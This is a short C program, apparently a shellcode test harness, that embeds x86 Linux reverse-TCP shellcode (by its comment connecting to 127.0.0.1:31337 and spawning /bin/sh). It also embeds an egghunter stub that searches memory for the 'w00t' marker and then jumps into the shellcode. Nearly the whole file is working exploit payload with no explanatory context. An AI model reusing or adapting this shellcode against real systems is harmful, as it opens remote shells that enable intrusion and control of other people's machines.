#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define EGG "\x77\x30\x30\x74"	/* w00t */

unsigned char egghunter[30];

void main()
{
				/* Reverse tcp 127.0.0.1:31337 */
  unsigned char shellcode[256] = \
				EGG
				EGG
				"\x99\x52\x42\x52\x89\xd3\x42\x52\x89\xe1"
				"\x6a\x66\x58\x89\xc7\xcd\x80\x97\x68\x7f"
				"\x00\x00\x01\x66\x68\x7a\x69\x66\x6a\x02"
				"\x89\xe1\x6a\x10\x51\x57\x89\xe1\xb3\x03"
				"\xcd\x80\x5b\x87\xca\xb0\x3f\xcd\x80\x49"
				"\x79\xf9\x99\x89\xd1\x52\x68\x2f\x2f\x73"
				"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b"
				"\xcd\x80";

  strcpy(egghunter, "\xeb\x10\x59\xb8"
		    EGG
		    "\x89\xcf\xaf\xe0\xfb\xaf\xe0\xf8\xff\xe7\xe8\xeb\xff\xff\xff");

  printf("Shellcode: %d bytes\n", strlen(shellcode));
 
  printf("Egghunter: %d bytes\n", strlen(egghunter));
 
  int (*ret)() = (int(*)())egghunter;
 
  ret();
}